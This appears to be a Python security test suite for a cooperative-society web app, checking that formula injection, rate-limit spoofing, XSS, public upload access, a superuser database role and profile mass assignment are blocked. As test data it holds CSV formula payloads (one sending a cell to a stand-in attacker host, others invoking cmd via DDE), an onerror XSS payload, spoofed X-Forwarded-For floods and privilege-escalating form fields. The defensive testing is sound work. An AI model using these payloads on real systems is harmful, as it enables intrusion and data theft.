"""
INJ-01 CSV/Excel formula injection through the PUBLIC lead form -> admin CSV export
INJ-02 lead-form rate limit keyed on a client-supplied X-Forwarded-For
INJ-03 member-controlled name reaches the members CSV export un-neutralised
XSS-01 script payload in member / lead fields is escaped by the templates
UPL-01 files saved under static/uploads are served with no login
TEN-01 the application's database role (blast radius / tenant isolation)
MASS-01 mass assignment on the member's own profile form
"""
import sys, os, unittest
sys.path.insert(0, os.path.dirname(__file__))
import _harness as H

app = H.boot_app()
os.environ['MARKETING_HQ'] = '1'
os.environ['MARKETING_ALLOWED_ORIGINS'] = 'cooperativems.com'


class InputTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.members, cls.loans = H.seed(app)

    def test_inj01_lead_csv_formula(self):
        c = app.test_client()
        r = c.post('/api/marketing/leads', json={
            'full_name': '=HYPERLINK("http://attacker.invalid/?x="&A1,"Click")', 'email': 'a@b.invalid',
            'society_name': '=cmd|\' /C calc\'!A0', 'message': '@SUM(1+1)*cmd|\' /C calc\'!A0',
            'consent_accepted': True})
        self.assertEqual(r.status_code, 200, r.get_data(as_text=True))
        adm = app.test_client(); H.login(adm, 'admin', H.ADMIN_PW)
        csv_text = adm.get('/marketing/leads/export.csv').get_data(as_text=True)
        dangerous = [l for l in csv_text.splitlines() if any(f',{ch}' in l or l.startswith(ch) for ch in ('=', '@'))
                     or ',"=' in l or ',"@' in l]
        print(f'\nINJ-01: exported CSV contains {len(dangerous)} line(s) with a cell beginning with = or @')
        self.assertEqual(dangerous, [])

    def test_inj02_xff_rate_limit_bypass(self):
        ok = 0
        for i in range(25):
            r = app.test_client().post('/api/marketing/leads', json={
                'full_name': f'Flood {i}', 'email': f'flood{i}@x.invalid', 'society_name': 'Flood Coop',
                'consent_accepted': True}, headers={'X-Forwarded-For': f'203.0.113.{i}'})
            ok += r.status_code == 200
        print(f'INJ-02: 25 submissions with rotating X-Forwarded-For -> {ok} accepted (limit is 8 per 15 min per IP)')
        self.assertLessEqual(ok, 8)

    def test_inj03_member_export_formula(self):
        from database import get_db
        with app.app_context():
            db = get_db()
            db.execute("UPDATE members SET first_name=? WHERE member_number='SEC001'", ("=1+1+cmd|' /C calc'!A0",))
            db.commit()
        c = app.test_client(); H.login(c, 'admin', H.ADMIN_PW)
        body = c.get('/members/export').get_data(as_text=True)
        print('INJ-03: /members/export contains raw formula cell:', "=1+1+cmd" in body)
        self.assertNotIn(",=1+1+cmd", body)
        self.assertNotIn('"=1+1+cmd', body)

    def test_xss01_escaped(self):
        from database import get_db
        payload = '<img src=x onerror=alert(1)>'
        with app.app_context():
            db = get_db()
            db.execute("UPDATE members SET last_name=? WHERE member_number='SEC002'", (payload,))
            db.commit()
            mid = db.execute("SELECT id FROM members WHERE member_number='SEC002'").fetchone()['id']
        c = app.test_client(); H.login(c, 'admin', H.ADMIN_PW)
        raw = []
        for u in ('/members', f'/members/{mid}', '/loans', '/savings', '/dashboard'):
            body = c.get(u).get_data(as_text=True)
            if payload in body:
                raw.append(u)
        print(f'XSS-01: pages rendering the payload unescaped: {raw}')
        self.assertEqual(raw, [])

    def test_upl01_static_uploads_public(self):
        d = os.path.join(H.REPO, 'static', 'uploads', 'payouts')
        os.makedirs(d, exist_ok=True)
        p = os.path.join(d, 'payout_SECTEST.pdf')
        open(p, 'wb').write(b'%PDF-1.4 sectest')
        try:
            r = app.test_client().get('/static/uploads/payouts/payout_SECTEST.pdf')
            r.close()
            print(f'UPL-01: unauthenticated GET of an uploaded payout-evidence file -> HTTP {r.status_code}')
            self.assertNotEqual(r.status_code, 200)
        finally:
            os.remove(p)

    def test_ten01_db_role(self):
        import psycopg2
        url = os.environ['DATABASE_URL']
        conn = psycopg2.connect(url); cur = conn.cursor()
        cur.execute('SELECT current_user, rolsuper FROM pg_roles WHERE rolname = current_user')
        user, sup = cur.fetchone()
        cur.execute("SELECT datname FROM pg_database WHERE datname LIKE 'coop_%' ORDER BY 1")
        dbs = [r[0] for r in cur.fetchall()]
        other = url.rsplit('/', 1)[0] + '/coop_a'
        reach = False
        try:
            psycopg2.connect(other).close(); reach = True
        except Exception:
            pass
        print(f'TEN-01: app role={user!r} superuser={sup}; databases visible to it={dbs}; '
              f'can open another client DB with the same credentials={reach}')
        self.assertFalse(sup, 'application connects as a Postgres superuser (mirrors deploy/vps/generate.py)')

    def test_mass01_profile_mass_assignment(self):
        from database import get_db
        c = app.test_client(); H.login(c, 'alice@sectest.invalid', H.MEMBER_PW)
        c.post('/edit-profile', data={'first_name': 'Alice', 'last_name': 'Alpha', 'email': 'alice@sectest.invalid',
                                      'phone': '08000000001', 'total_savings': '99999999', 'status': 'inactive',
                                      'role': 'admin', 'member_number': 'HACK'})
        with app.app_context():
            db = get_db()
            m = db.execute("SELECT total_savings, status, member_number FROM members WHERE email='alice@sectest.invalid'").fetchone()
            u = db.execute("SELECT role FROM users WHERE email='alice@sectest.invalid'").fetchone()
        print(f"MASS-01: after profile POST with extra fields -> total_savings={m['total_savings']}, "
              f"status={m['status']}, member_number={m['member_number']}, role={u['role']}")
        self.assertEqual(u['role'], 'member')
        self.assertNotEqual(m['total_savings'], 99999999)


if __name__ == '__main__':
    unittest.main()
